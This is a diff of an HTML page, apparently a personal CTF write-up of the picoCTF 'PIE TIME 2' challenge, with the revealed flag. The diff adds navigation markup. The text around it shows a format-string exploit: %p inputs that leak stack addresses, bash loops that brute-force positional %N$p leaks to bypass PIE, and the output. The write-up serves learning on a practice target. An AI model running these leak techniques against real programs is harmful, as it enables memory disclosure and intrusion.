@@ -1,8 +1,20 @@
 <head><link rel="stylesheet" href="../css/main.css"></head>
-<body><h1>PIE TIME 2</h1>
-<hr />
+<body>
+    <nav>
+        <ul class="nav">
+        <li><a href="../../index.html">Home</a></li>
+        <li><a href="https://github.com/ThomasCreagh/">Github</a></li>
+        <li>
+            <a href="https://www.linkedin.com/in/thomas-creagh/">Linkedin</a>
+        </li>
+        <li><a href="../../projects.html">Projects</a></li>
+        <li><a href="../index.html">SecurityWriteups</a></li>
+        </ul>
+    </nav>
+    <div class="page"><h1>PIE TIME 2</h1>
+<hr/>
 <p>this is a <a href="https://play.picoctf.org/practice/challenge/491?originalEvent=74&amp;page=2">pico ctf</a> challenge</p>
-<hr />
+<hr/>
 <h4>Description</h4>
 <blockquote>
 <p>Can you try to get the flag? I'm not revealing anything anymore!!
@@ -39,13 +51,13 @@ picoCTF{p13_5h0u1dn'7_134k_71356635}
 
 </code></pre>
 <p>There is also a printf vunerability as its not a string lineral from an buffer input. First thing I tried to exploit the printf vunerability is to do a enter a string of <code>%p</code>.</p>
-<p><img alt="screen shot of terminal with %p... inputs" src="../images/terminal_000.png" /></p>
+<p><div class="scroll-img"><img alt="screen shot of terminal with %p... inputs" src="../images/terminal_000.png"/></div></p>
 <p>I wasnt too sure about c format exploits so I found examples on this <a href="https://exploit-notes.hdks.org/exploit/binary-exploitation/method/binary-exploitation-with-format-string/">site</a></p>
 <pre><code>$ Enter your name:%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
 0x558c6abc82a10xfbad22880x7fff0e5e73d0(nil)0x21001(nil)0x7f852f6917600x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x25702570257025(nil)0xfffbdc94dca48000x7fff0e5e74300x558c447c54410x10x7f852f4e524a0x7fff0e5e75300x558c447c54000x1447c40400x7fff0e5e75480x7fff0e5e75480xee96304b47191866(nil)0x7fff0e5e7558(nil)0x7f852f6f2020
 </code></pre>
 <p>I looking for a hex value that ends with 400, since the main function is at <code>0000000000001400</code>.</p>
-<pre><code class="language-python">&gt; &gt; &gt; for i in a.split(&quot;0x&quot;):
+<pre><code class="language-python">&gt; &gt; &gt; for i in a.split("0x"):
 &gt; &gt; &gt; ... print(i)
 &gt; &gt; &gt; ...
 
@@ -84,9 +96,9 @@ I realised that the addresses starting with <code>0x7fff</code> were not where t
 <pre><code class="language-bash">#!/bin/bash
 
 for i in {1..128}; do
-    leak=$(echo -e &quot;%$i\$p&quot; | ./vuln | grep -o '0x[0-9a-fA-F]\{3,\}400$')
-    if [ -n &quot;$leak&quot; ]; then
-        echo &quot;value ($i): $leak&quot;
+    leak=$(echo -e "%$i\$p" | ./vuln | grep -o '0x[0-9a-fA-F]\{3,\}400$')
+    if [ -n "$leak" ]; then
+        echo "value ($i): $leak"
     fi
 done
 </code></pre>
@@ -157,9 +169,9 @@ I modified my script and checked for numbers with 4 in the 3 last digit:</p>
 <pre><code class="language-bash">#!/bin/bash
 
 for i in {1..128}; do
-    leak=$(echo -e &quot;%$i\$p&quot; | ./vuln | grep -o '0x[0-9a-fA-F]\{3,\}4[0-9a-fA-F]\{2,\}$')
-    if [ -n &quot;$leak&quot; ]; then
-        echo &quot;value ($i): $leak&quot;
+    leak=$(echo -e "%$i\$p" | ./vuln | grep -o '0x[0-9a-fA-F]\{3,\}4[0-9a-fA-F]\{2,\}$')
+    if [ -n "$leak" ]; then
+        echo "value ($i): $leak"
     fi
 done
 </code></pre>
@@ -222,4 +234,4 @@ You won!
 picoCTF{p13_5h0u1dn'7_134k_71356635}
 </code></pre>
 <h4>Conclusion</h4>
-<p>In conclusion, I was able to leak the stack adresses of the program because of the <code>printf</code> being unsafe with out the <code>%s</code> inside it to specify a string in C. Once I found it I was able to deduct the address of one of the functions by using <code>objdump</code> to deassemble the C program. Then I put it all together on the server and it returned the flag.</p></body>
+<p>In conclusion, I was able to leak the stack adresses of the program because of the <code>printf</code> being unsafe with out the <code>%s</code> inside it to specify a string in C. Once I found it I was able to deduct the address of one of the functions by using <code>objdump</code> to deassemble the C program. Then I put it all together on the server and it returned the flag.</p></div></body>
